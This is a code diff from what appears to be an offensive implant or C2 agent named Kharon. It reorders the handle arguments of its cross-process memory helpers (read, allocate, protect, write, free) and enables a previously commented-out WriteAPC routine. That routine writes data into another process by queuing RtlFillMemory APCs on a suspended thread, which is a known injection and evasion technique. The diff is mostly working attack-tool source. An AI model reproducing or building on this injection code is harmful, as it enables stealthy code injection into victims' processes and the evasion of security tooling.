@@ -1,21 +1,21 @@
 #include <Kharon.h>
 
 auto DECLFN Memory::Read(
-    _In_  HANDLE  Handle,
     _In_  PVOID   Base,
     _In_  BYTE*   Buffer,
     _In_  SIZE_T  Size,
-    _Out_ SIZE_T* Reads
+    _Out_ SIZE_T* Reads,
+    _In_  HANDLE  Handle
 ) -> BOOL {
     return Self->Krnl32.ReadProcessMemory( Handle, Base, Buffer, Size, Reads );
 }
 
 auto DECLFN Memory::Alloc(
-    _In_ HANDLE Handle,
     _In_ PVOID Base,
     _In_ ULONG Size,
     _In_ ULONG AllocType,
-    _In_ ULONG Protect
+    _In_ ULONG Protect,
+    _In_ HANDLE Handle
 ) -> PVOID {
     PVOID BaseAddress = NULL;
 
@@ -42,11 +42,11 @@ auto DECLFN Memory::Alloc(
 }
 
 auto DECLFN Memory::Protect(
-    _In_  HANDLE Handle,
     _In_  PVOID  Base,
     _In_  ULONG  Size,
     _In_  ULONG  NewProt,
-    _Out_ ULONG* OldProt
+    _Out_ ULONG* OldProt,
+    _In_  HANDLE Handle
 ) -> BOOL {
     BOOL Success = FALSE;
 
@@ -77,38 +77,38 @@ auto DECLFN Memory::WriteAPC(
     _In_ BYTE*  Buffer,
     _In_ ULONG  Size
 ) -> BOOL {
-    // HANDLE      ThreadHandle = NULL;
-    // NTSTATUS    NtStatus     = STATUS_SUCCESS;
+    HANDLE      ThreadHandle = NULL;
+    NTSTATUS    NtStatus     = STATUS_SUCCESS;
 
-    // ULONG ThreadId = 0;
-    // PVOID Dummy    = (PVOID)1;
-    // ThreadHandle = Self->Td->Create( Handle, Self->Ntdll.RtlExitUserThread, 0, 0, CREATE_SUSPENDED, &ThreadId );
+    ULONG ThreadId = 0;
+    PVOID Dummy    = (PVOID)1;
+    ThreadHandle = Self->Td->Create( Handle, (PVOID)Self->Ntdll.RtlExitUserThread, 0, 0, CREATE_SUSPENDED, &ThreadId );
 
-    // if ( Size ) {
-    //     for ( INT i = 0; i < Size; i++ ) {
-    //         NtStatus = Self->Td->QueueAPC( ThreadHandle, Self->Ntdll.RtlFillMemory, ( Buffer + i ), Dummy, ( Buffer + i ) );
-    //     }
-    // } else {
-    //     NtStatus = Self->Td->QueueAPC( ThreadHandle, Self->Ntdll.RtlFillMemory, Buffer, 0, NULL );
-    // }
+    if ( Size ) {
+        for ( INT i = 0; i < Size; i++ ) {
+            NtStatus = Self->Td->QueueAPC( (PVOID)Self->Ntdll.khRtlFillMemory, ThreadHandle, ( Buffer + i ), Dummy, ( Buffer + i ) );
+        }
+    } else {
+        NtStatus = Self->Td->QueueAPC( (PVOID)Self->Ntdll.khRtlFillMemory, ThreadHandle, Buffer, 0, NULL );
+    }
    
-    // if ( NtStatus != STATUS_SUCCESS ) {
-    //     Self->Krnl32.TerminateThread( ThreadHandle, EXIT_SUCCESS );
-    //     Self->Ntdll.NtClose( ThreadHandle );
-    //     return FALSE;
-    // } else {
-    //     Self->Krnl32.ResumeThread( ThreadHandle );
-    //     Self->Krnl32.WaitForSingleObject( ThreadHandle, INFINITE );
-    //     Self->Ntdll.NtClose( ThreadHandle );
-    //     return TRUE;
-    // }
+    if ( NtStatus != STATUS_SUCCESS ) {
+        Self->Krnl32.TerminateThread( ThreadHandle, EXIT_SUCCESS );
+        Self->Ntdll.NtClose( ThreadHandle );
+        return FALSE;
+    } else {
+        Self->Krnl32.ResumeThread( ThreadHandle );
+        Self->Krnl32.WaitForSingleObject( ThreadHandle, INFINITE );
+        Self->Ntdll.NtClose( ThreadHandle );
+        return TRUE;
+    }
 }
 
 auto DECLFN Memory::Write(
-    _In_ HANDLE Handle,
     _In_ PVOID  Base,
     _In_ BYTE*  Buffer,
-    _In_ ULONG  Size
+    _In_ ULONG  Size,
+    _In_ HANDLE Handle
 ) -> BOOL {
     BOOL      Success = FALSE;
     ULONG_PTR Written = 0;
@@ -129,10 +129,10 @@ auto DECLFN Memory::Write(
 }
 
 auto DECLFN Memory::Free(
-    _In_ HANDLE Handle,
     _In_ PVOID  Base,
     _In_ ULONG  Size,
-    _In_ ULONG  FreeType
+    _In_ ULONG  FreeType,
+    _In_ HANDLE Handle
 ) -> BOOL {
     if ( !Handle ) {
         return Self->Krnl32.VirtualFree( Base, Size, FreeType );
